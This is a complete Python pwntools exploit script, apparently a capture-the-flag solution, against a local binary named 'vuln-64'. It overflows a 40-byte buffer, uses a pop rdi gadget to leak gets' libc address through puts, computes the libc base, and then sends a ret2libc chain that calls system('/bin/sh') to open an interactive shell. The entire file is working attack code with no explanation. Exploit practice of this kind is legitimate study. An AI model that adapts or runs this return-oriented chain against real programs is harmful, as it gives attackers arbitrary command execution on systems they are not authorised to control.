from pwn import *

offset=40

exe='./vuln-64'

elf=context.binary=ELF(exe)

libc=elf.libc


p=process()


pop_rdi=0x4011cb
p.recvline()
info(hex(elf.address))
payload=flat(
        b'a'*offset,
        pop_rdi,
        elf.got['gets'],
        elf.plt['puts'],
        elf.sym['main'],
        )
p.sendline(payload)
gets_leak=p.recv(6)
info(gets_leak)
libc_addr=u64(gets_leak+b'\x00'*2)
info(hex(libc_addr))
libc.address=libc_addr-libc.sym['gets']
payload=flat(
        'b'*offset,
        pop_rdi,
        next(libc.search(b"/bin/sh")),
        pop_rdi+1,
        libc.sym['system'],
        0x0
        )
p.clean()
p.sendline(payload)

p.interactive()
